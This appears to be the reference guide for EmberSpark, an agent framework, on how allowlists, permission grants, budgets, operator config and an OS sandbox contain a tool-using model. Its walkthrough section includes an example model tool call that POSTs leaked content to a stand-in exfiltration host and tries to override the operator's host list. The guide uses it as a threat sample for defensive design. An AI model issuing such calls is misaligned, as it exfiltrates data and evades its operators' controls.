# Tools & Permissions: A Complete Guide

This is the long-form reference for everything EmberSpark knows about tools, plugins, permissions, grants, sandboxes, and how they compose. Read this before wiring up a new agent. If you only have 10 minutes, skim the **TL;DR**, the **mental model**, and the **five-layer checklist**.

---

## TL;DR

EmberSpark treats the model as potentially hostile. Every side effect passes through five gates, each of which can refuse the call:

1. **Plugin allowlist** — is this plugin enabled for this agent at all?
2. **Permission grants** — does the agent have every permission this plugin declared it needs?
3. **Budget** — has the run already used up its iteration / model-call / tool-call / wall-clock budget?
4. **Operator plugin config** — is the operator config narrower than what the model is trying to do? If so, the operator wins.
5. **OS sandbox** — even if all four Python layers let the call through, the kernel still only exposes the scoped bind mounts, allowed network, rlimits, etc.

If any gate says no, the call is refused, audited, and the model receives a sanitized error with no schema internals.

---

## Mental model

Think of it like this:

```
┌─── Agent YAML ──────────────────────────────────────┐
│                                                      │
│   plugins.allow: [http_client, sqlite, shell]       │ ← gate 1
│                                                      │
│   permissions.grants: [net.http, fs.read, subprocess]│ ← gate 2
│                                                      │
│   permissions.filesystem.allow_paths: [~/workspace]  │
│   permissions.network.allow_hosts: [api.github.com]  │ ← baseline for gate 4
│   permissions.sandbox.cpu_seconds: 30                │ ← baseline for gate 5
│                                                      │
│   runtime.max_tool_calls: 25                         │ ← gate 3
│                                                      │
└──────────────────────────────────────────────────────┘
           │
           ▼
┌─── Plugin Config (DB, edited via Web UI) ───────────┐
│                                                      │
│   http_client.allow_hosts: [api.github.com]          │
│   http_client.allowed_methods: [GET]                 │ ← gate 4
│   sqlite.databases: [{name:'notes', path:..., mode:'read'}]
│   shell.enabled: false                               │
│                                                      │
└──────────────────────────────────────────────────────┘
           │
           ▼
┌─── Model Per-Call Args ─────────────────────────────┐
│                                                      │
│   { "url": "...", "method": "GET", ... }             │ ← merged with operator config
│                                                      │
└──────────────────────────────────────────────────────┘
           │
           ▼
┌─── Sandbox ─────────────────────────────────────────┐
│                                                      │
│   bwrap --ro-bind ~/workspace ~/workspace            │ ← gate 5
│         --bind <rw_paths>                            │
│         --unshare-net (if no network)                │
│         --seccomp <filter>                           │
│                                                      │
└──────────────────────────────────────────────────────┘
```

The **operator** controls every piece above. The **model** gets to make tool calls that pass through all of them. The **runtime** audits every mutation along the way.

---

## Layer 1 — The plugin allowlist

The first and simplest gate. In your agent YAML:

```yaml
spec:
  plugins:
    allow:
      - http_client
      - filesystem
      - markdown_writer
```

- Only these three plugins are usable by this agent.
- An attempt to call `shell` or `sqlite` gets a clean `PermissionDenied` at the tool-runtime seam, is audited, and is returned to the model as "plugin not in agent allowlist".
- This is the fastest way to narrow an agent's reach: **omit plugins from the allowlist entirely**. The runtime never even tries to load their config.

### How to think about it

- Start by listing the narrowest possible plugin set that lets the agent do its job. Don't add `shell` "just in case."
- If you catch yourself adding every built-in plugin, step back and ask why this agent needs all of them. The answer might be "it shouldn't."
- Plugin allowlists are per-agent. Different agents can have different plugin sets.

---

## Layer 2 — Permission grants

Every plugin declares the permissions it **needs** to function. The agent must grant a superset of those permissions or the call is refused.

### The permission enum

From [`spark/config/enums.py`](../spark/config/enums.py):

| Permission | What it controls |
|---|---|
| `fs.read` | Reading files via the filesystem plugin (including `list`, `stat`, `read`). |
| `fs.write` | Writing files (write, append, create). |
| `fs.list` | Directory listing only — a read-only subset. |
| `net.http` | Outbound HTTPS via the http_client plugin. |
| `subprocess` | Running subprocesses via the shell plugin. |
| `secrets.read` | Asking the secret manager for a declared secret. Required by http_client because it injects secret headers. |

### What each built-in plugin needs

| Plugin | Required permissions |
|---|---|
| `filesystem` | `fs.read`, `fs.write`, `fs.list` |
| `http_client` | `net.http`, `secrets.read` |
| `http_tool` | `net.http`, `secrets.read` |
| `markdown_writer` | `fs.write` |
| `shell` | `subprocess` |
| `sqlite` | `fs.read` (it reads the database file) |
| `web_search` | `net.http`, `secrets.read` |
| `pdf_reader` | `fs.read` |
| `csv_io` | `fs.read`, `fs.write` |
| `json_query` | (none — pure transform) |
| `rss_reader` | `net.http` |
| `datetime` | (none — pure compute) |
| `email_sender` | `net.http`, `secrets.read`, `fs.read` (attachments) |
| `git` | `subprocess`, `fs.read` |
| `image_gen` | `net.http`, `secrets.read`, `fs.write` (deliverables) |
| `webhook` | `net.http`, `secrets.read` |
| `telegram_messenger` | `net.http`, `secrets.read` |

### How to grant

```yaml
spec:
  permissions:
    grants:
      - fs.read
      - fs.write
      - fs.list
      - net.http
      - secrets.read
      # intentionally no subprocess — this agent shouldn't run shell commands
```

If the agent lists `shell` in `plugins.allow` but doesn't grant `subprocess`, the shell plugin will be rejected at the first call with a clear error, audited, and shown to the model as "plugin requires permissions: ['subprocess']". You still saw the attempt in the logs, which is the point.

### How to think about it

- **Granting without allowing is harmless** — you can list `subprocess` in grants without having `shell` in the plugin allowlist, and nothing changes. The gate that matters is Layer 1.
- **Allowing without granting is an audit trap** — the plugin is loaded and tried, and every failed attempt shows up in the audit log. This is sometimes deliberate: you can tell when the model was reaching for a capability it doesn't have.
- Granular grants (`fs.list` without `fs.read`) let you stage capability. A dry-run agent might have `fs.list` but not `fs.read` or `fs.write` — it can see what files exist but not touch their contents.

---

## Layer 3 — Budgets

Budgets are an **agent-wide** ceiling enforced by [`BudgetGuard`](../spark/plugins/tool_runtime.py). They're configured in the `runtime` block of the agent YAML.

```yaml
spec:
  runtime:
    max_iterations: 12        # LangGraph loop iterations
    max_model_calls: 30       # total llm.ainvoke() calls
    max_tool_calls: 25        # total tool invocations
    max_runtime_seconds: 900  # wall-clock ceiling
```

### What each budget does

- **`max_iterations`** — how many planner → act cycles the engine will run. A stuck loop that keeps re-planning without progress hits this ceiling first.
- **`max_model_calls`** — total calls to `_invoke_model`. Includes the planner and reflection. This is the best proxy for cost.
- **`max_tool_calls`** — total calls through `ToolExecutor`. Each successful tool invocation ticks this counter.
- **`max_runtime_seconds`** — hard wall-clock timeout via `asyncio.wait_for(...)`. Protects against a provider that silently hangs.

### Per-task overrides

Tasks can tighten budgets for a specific run without touching the agent:

```yaml
# in a task YAML
spec:
  budgets:
    max_runtime_seconds: 300
    max_model_calls: 10
    max_tool_calls: 8
```

### Cost budgets (separate system)

Cost budgets live in a different table and are enforced by [`spark.cost.tracker.check_budgets`](../spark/cost/tracker.py). They're created via the web UI's Cost page and are scoped `global` / `agent` / `provider`. They run **before** the agent starts and refuse to fire the run if the period limit has been exceeded.

### How to think about it

- Budgets exist to protect you from runaway loops, not to reward efficiency. Set them generously for a working agent and tighter for a new one.
- The engine emits `budget.tick` events on every tick, so the Web UI can show live progress bars.
- Budget exhaustion isn't "failure" — it's the runtime doing its job. The audit log records it explicitly as `budget.hard_stop` or `BudgetExceeded`.

---

## Layer 4 — Plugin config (operator wins)

This is the layer that confuses people most, so let's go slowly.

Every plugin declares two schemas:

- **`input_schema`** — the fields the model is allowed to set on a per-call basis.
- **`config_schema`** — the fields the operator controls through the Web UI.

These schemas **can overlap**. When they do, the operator's value wins at merge time.

### A concrete example

The `http_client` plugin's `input_schema` includes `allow_hosts`, `method`, `url`, etc. Its `config_schema` includes `allow_hosts`, `allowed_methods`, `user_agent`, etc.

You configure it in the UI:

```json
{
  "allow_hosts": ["api.github.com"],
  "allowed_methods": ["GET"],
  "user_agent": "my-org/1.0"
}
```

The model calls `http_client` with:

```json
{
  "url": "https://api.github.com/repos/foo/bar",
  "method": "GET",
  "allow_hosts": ["evil.example.com"],
  "body": null
}
```

At [`ToolExecutor.call`](../spark/plugins/tool_runtime.py), `merge_config_and_args` runs:

1. Copy the model's args into a new dict.
2. For every key in the operator's config that also exists in `input_schema`, **overwrite** the model's value.
3. For every key that only exists in `config_schema`, stash it in a separate `operator_only` dict that will become `ctx.plugin_config`.

The final merged args the plugin sees:

```json
{
  "url": "https://api.github.com/repos/foo/bar",
  "method": "GET",
  "allow_hosts": ["api.github.com"],
  "body": null
}
```

And `ctx.plugin_config` receives:

```json
{
  "allow_hosts": ["api.github.com"],
  "allowed_methods": ["GET"],
  "user_agent": "my-org/1.0"
}
```

The plugin also enforces `allowed_methods` itself from `ctx.plugin_config`, because `allowed_methods` is not in the `input_schema` — the model never sees it as a concept.

### Operator-only fields

Some fields are deliberately kept out of `input_schema` so the model cannot reference them at all. These go into `ctx.plugin_config`:

- `http_client.allowed_methods` — the set of HTTP methods allowed for this agent
- `http_client.user_agent` — the User-Agent header value
- `filesystem.read_only` — a big red switch that disables all writes
- `markdown_writer.allow_append` / `allow_overwrite` — disables `mode=append` or `mode=write`
- `shell.enabled` — master switch for the shell plugin (default `False`)
- `shell.allowed_commands` — the named command set

A plugin implementation reads these inside `execute`:

```python
plugin_config = getattr(ctx, "plugin_config", {}) or {}
if plugin_config.get("read_only") and args.op in ("write", "append"):
    raise PermissionError("filesystem plugin configured read_only")
```

### Why the operator wins

If the operator narrowed `allow_hosts` and the model were allowed to widen it, the operator's narrowing would be useless. This is the whole point of the system:

> **The operator sets the ceiling. The model sets the specifics under the ceiling. The operator can always narrow, never ask.**

### How to think about it

- The UI is the single place to edit plugin behavior. Do not edit the DB directly.
- Every config write is audited at `elevated` severity. Reason field is required.
- Plugin schema changes (after an upgrade) can invalidate your saved config. The `schema_hash` column detects the drift and the UI flags it — re-save to acknowledge.
- If you want an agent to never even see a capability, drop the plugin from Layer 1. If you want the agent to see it but scoped down, use Layer 4.

---

## Layer 5 — The OS sandbox

Everything above is Python code. If a plugin was somehow compromised at build time, or a bug bypassed the merge logic, the Python layer isn't the last word. The sandbox is.

### What the sandbox does

Every tool call runs in a child process under one of:

- **Bubblewrap** on Linux (default)
- **nsjail** on Linux (opt-in, stricter)
- **Seatbelt (`sandbox-exec`)** on macOS (default)

The [`SandboxPolicy`](../spark/sandbox/policy.py) passed to the backend includes:

| Field | Source | What it enforces |
|---|---|---|
| `ro_paths` | Derived from runtime + plugin module | Read-only bind mounts for Python + plugin code |
| `rw_paths` | `permissions.filesystem.allow_paths` | Read-write bind mounts — the ONLY directories the child can write |
| `allow_network` | `needs_network` on the plugin class | If False, `--unshare-net` or netns isolation |
| `allow_hosts` | `permissions.network.allow_hosts` | Only used informationally; the http_client still does its own SSRF defense |
| `rlimits.cpu_seconds` | `permissions.sandbox.cpu_seconds` | Kernel-enforced CPU time ceiling |
| `rlimits.memory_mb` | `permissions.sandbox.memory_mb` | Address-space limit |
| `rlimits.max_open_files` | `permissions.sandbox.max_open_files` | File descriptor ceiling |
| `rlimits.max_processes` | `permissions.sandbox.max_processes` | Process count ceiling |
| `timeout_seconds` | `permissions.sandbox.timeout_seconds` | Wall-clock wait_for timeout in the parent |
| `env` | `{PATH, LC_ALL, PYTHONHASHSEED, HOME=/tmp}` | Scrubbed env; secrets go through stdin, never env vars |

### The fail-closed default

If no sandbox backend is installed or working on the host, `spark serve` refuses to start. There is **no** "run without sandbox" escape hatch. This is a deliberate choice — a missing sandbox would be a silent regression in the safety posture.

If you see:

```
sandbox unavailable: No sandbox backend available. Install bubblewrap (Linux) or ensure sandbox-exec is present (macOS).
```

…install `bubblewrap`:

```bash
sudo apt install bubblewrap
```

…or use a macOS host. Windows is not supported.

### How to think about it

- The sandbox cannot be disabled per-agent. You can **tune** rlimits (give the child more memory for ML workloads, tighter CPU seconds for cheap operations), but you cannot turn the sandbox off.
- Sandbox escapes are possible in theory — bubblewrap has had CVEs, seatbelt has corner cases. We treat the sandbox as "one of several defenses." That's why Layers 1–4 exist.
- The sandbox never sees your secrets in the environment block. They arrive as a JSON frame on stdin, which is read by the worker process before it invokes your plugin. `/proc/<pid>/environ` is clean.

---

## Putting it all together: a walkthrough

Here's a full trace of a tool call, end to end.

### Setup

Agent YAML:

```yaml
apiVersion: spark.veilfire.dev/v1alpha1
kind: Agent
metadata:
  name: research-assistant
spec:
  runtime:
    provider:
      type: anthropic
      model: claude-opus-4-6
      api_key_ref: anthropic_key
    max_iterations: 12
    max_model_calls: 30
    max_tool_calls: 25
    privacy_mode: strict
  plugins:
    allow:
      - http_client
      - markdown_writer
  permissions:
    filesystem:
      allow_paths:
        - ~/Documents/spark-workspace
    network:
      allow_hosts:
        - api.github.com
    sandbox:
      cpu_seconds: 30
      memory_mb: 512
    grants:
      - fs.write
      - net.http
      - secrets.read
```

Operator then goes to **Plugins → http_client** and narrows:

```json
{
  "allow_hosts": ["api.github.com"],
  "allow_http": false,
  "allowed_methods": ["GET"],
  "max_response_bytes": 5000000,
  "connect_timeout_seconds": 5.0,
  "read_timeout_seconds": 15.0,
  "user_agent": "research-bot/1.0"
}
```

### The model tries to make a call

The planner generates:

```json
{
  "tool": "http_client",
  "args": {
    "method": "POST",
    "url": "https://evil.example.com/exfil",
    "allow_hosts": ["evil.example.com"],
    "body": "leaked-content-here"
  }
}
```

### What happens

1. **Layer 1 — allowlist** — `http_client` is in `plugins.allow`. ✓
2. **Layer 2 — permissions** — http_client requires `{net.http, secrets.read}`. Agent grants `{fs.write, net.http, secrets.read}`. Superset, ✓
3. **Layer 3 — budget** — budget tick: tool_calls = 1, under 25. ✓
4. **Layer 4 — plugin config merge** — operator config loaded, merged into args:
   - `allow_hosts` → operator wins → `["api.github.com"]`
   - `method` → both agree → `POST`
   - `allowed_methods` → operator-only → goes to `ctx.plugin_config`
   - Merged args: `{method: "POST", url: "https://evil.example.com/exfil", allow_hosts: ["api.github.com"], body: "..."}`
5. **Pydantic schema validation** on merged args — passes.
6. **Sandbox dispatch** — RequestFrame built, sandbox backend picked (bubblewrap), child process spawned with bind mounts + unshare flags.
7. **Inside the plugin**:
   - Reads `ctx.plugin_config["allowed_methods"]` → `["GET"]`.
   - `args.method` is `"POST"` → **PermissionError: http method 'POST' not in allowed_methods ['GET']**.
8. **Child process exits** with an error. Parent receives the error.
9. **`ToolExecutor.call`** logs `tool.error_classified` with `error_class=permission_denied`, returns a sanitized error to the engine.
10. **Engine** emits `PermissionDenied` to the model in the next message: `"tool error [permission_denied]: http method 'POST' not in allowed_methods ['GET']"`.

Separately: even if the plugin had approved `POST`, the SSRF defense in [`validate_url`](../spark/utils/net.py) would have rejected `evil.example.com` because the merged `allow_hosts` is `["api.github.com"]` — the model can't inject a new host.

And even if that somehow failed, the sandbox's `--unshare-net` (when the plugin doesn't need network — which isn't this case, but hypothetically) would reject the outbound connection at the kernel.

---

## The five-layer checklist

Before you finalize an agent YAML, walk this list:

- [ ] **Layer 1:** Is every plugin in `plugins.allow` actually needed? Remove anything you can't justify in one sentence.
- [ ] **Layer 2:** Are the permission grants a minimal superset of what the allowed plugins need? No extra permissions.
- [ ] **Layer 3:** Are the budgets realistic for this agent's intended work, and not pulled out of thin air? Start conservative, widen if needed.
- [ ] **Layer 4:** Have you edited the plugin configs in the Web UI? Don't rely on defaults for anything that touches external state — narrow `allow_hosts`, narrow `allow_paths`, set `read_only` on filesystem where possible, keep `shell.enabled=false` until an operator explicitly needs it.
- [ ] **Layer 5:** Are the sandbox rlimits sensible? The defaults (30 CPU-seconds, 512 MB) are fine for most workloads but may be too tight for ML inference or too loose for trivial HTTP calls.

If you can't tick all five, the agent isn't ready.

---

## Further reading

- [plugin-config.md](plugin-config.md) — the complete per-plugin config reference
- [plugin-authoring.md](plugin-authoring.md) — writing your own plugin
- [security-posture.md](security-posture.md) — threat model + OWASP mapping
- [wiki/Permissions-Guide.md](../wiki/Permissions-Guide.md) — the same material in wiki form, with more examples
